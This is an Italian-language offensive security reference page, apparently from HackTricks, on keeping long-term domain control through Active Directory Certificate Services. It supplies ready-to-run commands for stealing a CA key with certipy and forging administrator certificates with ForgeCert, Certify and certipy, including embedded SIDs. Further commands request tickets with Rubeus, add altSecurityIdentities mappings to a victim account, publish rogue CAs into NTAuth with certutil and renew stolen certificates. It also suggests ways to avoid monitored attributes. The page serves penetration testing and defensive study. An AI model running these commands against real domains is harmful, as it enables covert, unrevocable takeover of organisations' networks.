# Persistenza di dominio AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Questo è un riepilogo delle tecniche di persistenza di dominio descritte in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consultalo per ulteriori dettagli.<sup>[[5]](#references)</sup>

## Forgiare certificati con certificati CA sottratti (Golden Certificate) - DPERSIST1

Come si può capire se un certificato è un certificato CA?

È possibile determinare che un certificato è un certificato CA se sono soddisfatte diverse condizioni:<sup>[[5]](#references)</sup>

- Il certificato è archiviato sul server CA, con la chiave privata protetta dal DPAPI del computer o da hardware come TPM/HSM, se il sistema operativo lo supporta.
- I campi Issuer e Subject del certificato corrispondono al distinguished name della CA.
- Un'estensione "CA Version" è presente esclusivamente nei certificati CA.
- Il certificato non contiene campi Extended Key Usage (EKU).

Per estrarre la chiave privata di questo certificato, il metodo supportato consiste nell'usare lo strumento `certsrv.msc` sul server CA tramite la GUI integrata. Tuttavia, questo certificato non è diverso dagli altri archiviati nel sistema; è quindi possibile applicare metodi come la tecnica [THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) per estrarlo.

È anche possibile ottenere il certificato e la chiave privata usando Certipy con il seguente comando:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Dopo aver ottenuto il certificato della CA e la relativa chiave privata in formato `.pfx`, è possibile utilizzare strumenti come [ForgeCert](https://github.com/GhostPack/ForgeCert) per generare certificati validi:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> L'utente preso di mira per la contraffazione del certificato deve essere attivo e in grado di autenticarsi in Active Directory affinché il processo vada a buon fine. Contraffare un certificato per account speciali come krbtgt è inefficace.

Questo certificato contraffatto sarà **valido** fino alla data di scadenza specificata e finché il certificato della root CA sarà **valido** (di solito da 5 a **oltre 10 anni**). È valido anche per le **macchine**; quindi, combinandolo con **S4U2Self**, un attacker può **mantenere la persistenza su qualsiasi macchina del dominio** finché il certificato della CA è valido.\
Inoltre, i **certificati generati** con questo metodo **non possono essere revocati**, poiché la CA non ne è a conoscenza.

### Operare con Strong Certificate Mapping Enforcement (2025+)

Dall'11 febbraio 2025 (dopo il rollout di KB5014754), i domain controller usano per impostazione predefinita **Full Enforcement** per il mapping dei certificati. In pratica, ciò significa che i certificati contraffatti devono:

- Contenere un binding forte all'account di destinazione (ad esempio, l'estensione di sicurezza SID), oppure
- Essere associati a un mapping esplicito forte sull'attributo `altSecurityIdentities` dell'oggetto di destinazione.<sup>[[1]](#references)</sup>

Un approccio affidabile per la persistenza consiste nel generare un certificato contraffatto concatenato alla Enterprise CA sottratta e poi aggiungere un mapping esplicito forte al principal vittima:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Note
- Se riesci a creare certificati contraffatti che includono l'estensione di sicurezza SID, questi verranno mappati implicitamente anche con Full Enforcement. In caso contrario, preferisci mapping espliciti forti. Per ulteriori informazioni sui mapping espliciti, consulta [account-persistence](account-persistence.md).
- La revoca non aiuta i difensori in questo caso: i certificati contraffatti sono sconosciuti al database della CA e quindi non possono essere revocati.

#### Forging compatibile con Full Enforcement (SID-aware)

Gli strumenti aggiornati consentono di incorporare direttamente il SID, mantenendo utilizzabili i golden certificates anche quando i DC rifiutano i mapping deboli:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Incorporando il SID eviti di dover modificare `altSecurityIdentities`, che potrebbe essere monitorato, soddisfacendo comunque i controlli di strong mapping.

## Fidarsi dei certificati CA rogue - DPERSIST2

L’oggetto `NTAuthCertificates` è definito in modo da contenere uno o più **certificati CA** nel suo attributo `cacertificate`, utilizzato da Active Directory (AD). Il processo di verifica eseguito dal **domain controller** consiste nel controllare l’oggetto `NTAuthCertificates` per trovare una voce corrispondente alla **CA specificata** nel campo Issuer del **certificato** usato per l’autenticazione. Se viene trovata una corrispondenza, l’autenticazione prosegue.<sup>[[5]](#references)</sup>

Un attacker può aggiungere un certificato CA autofirmato all’oggetto `NTAuthCertificates`, se ha il controllo di questo oggetto AD. Normalmente, solo i membri del gruppo **Enterprise Admin** e gli **Domain Admins** o gli **Administrators** del **dominio radice della foresta** hanno l’autorizzazione a modificare questo oggetto. Possono modificare l’oggetto `NTAuthCertificates` usando `certutil.exe` con il comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, oppure utilizzando il [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Altri comandi utili per questa tecnica:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Questa funzionalità è particolarmente rilevante se usata insieme al metodo descritto in precedenza, che prevede l'uso di ForgeCert per generare dinamicamente certificati.

> Considerazioni sulla mappatura successive al 2025: inserire una CA rogue in NTAuth stabilisce la fiducia solo nella CA emittente. Per usare i certificati leaf per l'accesso quando i DC sono in **Full Enforcement**, il certificato leaf deve contenere l'estensione di sicurezza SID oppure deve essere presente una mappatura esplicita forte sull'oggetto di destinazione (ad esempio, Issuer+Serial in `altSecurityIdentities`). Vedi {{#ref}}account-persistence.md{{#endref}}.

## Configurazione errata malevola - DPERSIST3

Le opportunità di **persistenza** tramite **modifiche ai descrittori di sicurezza** dei componenti di AD CS sono numerose. Le modifiche descritte nella sezione "[Domain Escalation](domain-escalation.md)" possono essere implementate in modo malevolo da un attaccante con accesso elevato. Ciò include l'aggiunta di "diritti di controllo" (ad es., WriteOwner/WriteDACL/ecc.) a componenti sensibili quali:<sup>[[5]](#references)</sup>

- L'oggetto **computer AD del server CA**
- Il **server RPC/DCOM del server CA**
- Qualsiasi **oggetto AD discendente o contenitore** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (ad esempio, il contenitore Certificate Templates, il contenitore Certification Authorities, l'oggetto NTAuthCertificates, ecc.)
- **Gruppi AD a cui l'organizzazione ha delegato esplicitamente diritti di controllo sulla CA o sui template**. Il gruppo integrato Cert Publishers è autorizzato a pubblicare certificati negli oggetti utente in AD; la sola appartenenza al gruppo non conferisce diritti di controllo o di enrollment sulla CA o sui template. Verifica separatamente le autorizzazioni pertinenti della CA e dei template. Vedi la [descrizione di Cert Publishers di Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) e le [autorizzazioni dei template di certificato](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Un esempio di implementazione malevola consiste nell'aggiunta, da parte di un attaccante con **autorizzazioni elevate** nel dominio, del diritto **`WriteOwner`** al template di certificato predefinito **`User`**, assegnandolo a sé stesso come principal. Per sfruttarlo, l'attaccante cambierebbe innanzitutto il proprietario del template **`User`** impostando sé stesso. Poi, imposterebbe **`mspki-certificate-name-flag`** su **1** nel template per abilitare **`ENROLLEE_SUPPLIES_SUBJECT`**, consentendo a un utente di specificare un Subject Alternative Name nella richiesta. A quel punto, l'attaccante potrebbe effettuare l'**enrollment** usando il **template**, scegliendo come nome alternativo quello di un **amministratore di dominio**, e utilizzare il certificato ottenuto per autenticarsi come DA.

Impostazioni pratiche che gli attaccanti possono configurare per ottenere una persistenza di lungo termine nel dominio (per i dettagli e il rilevamento, vedi {{#ref}}domain-escalation.md{{#endref}}):

- Flag dei criteri della CA che consentono ai richiedenti di specificare il SAN (ad es., abilitando `EDITF_ATTRIBUTESUBJECTALTNAME2`). In questo modo, i percorsi simili a ESC1 restano sfruttabili.
- DACL o impostazioni dei template che consentono l'emissione di certificati utilizzabili per l'autenticazione (ad es., aggiungendo EKU Client Authentication, abilitando `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controllo dell'oggetto `NTAuthCertificates` o dei contenitori della CA per reinserire continuamente gli emittenti rogue se i difensori tentano di rimuoverli.

> [!TIP]
> Negli ambienti hardened dopo KB5014754, associare queste configurazioni errate a mappature esplicite forti (`altSecurityIdentities`) garantisce che i certificati emessi o contraffatti restino utilizzabili anche quando i DC applicano la mappatura forte.

### Abuso del rinnovo dei certificati (ESC14) per la persistenza

Se comprometti un certificato utilizzabile per l'autenticazione (o un certificato Enrollment Agent), puoi **rinnovarlo indefinitamente**, finché il template emittente resta pubblicato e la CA continua a considerare attendibile la catena dell'emittente. Il rinnovo mantiene i binding dell'identità originale ma estende la validità, rendendo difficile l'espulsione dell'attaccante a meno che il template non venga corretto o la CA non venga ripubblicata.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Se i domain controller sono in **Full Enforcement**, aggiungi `-sid <victim SID>` (oppure usa un template che includa ancora l’estensione di sicurezza SID) affinché il certificato leaf rinnovato continui a essere mappato in modo forte, senza modificare `altSecurityIdentities`. Gli attacker con privilegi di amministratore CA possono anche modificare `policy\RenewalValidityPeriodUnits` per allungare la durata dei certificati rinnovati prima di rilasciarsene uno.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Modifiche all’autenticazione basata su certificati nei domain controller Windows (tempistiche di enforcement e mapping forti)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Riferimento ai comandi e utilizzo di forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (forge integrato con supporto SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Panoramica sull’abuso del rinnovo ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: abuso di Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
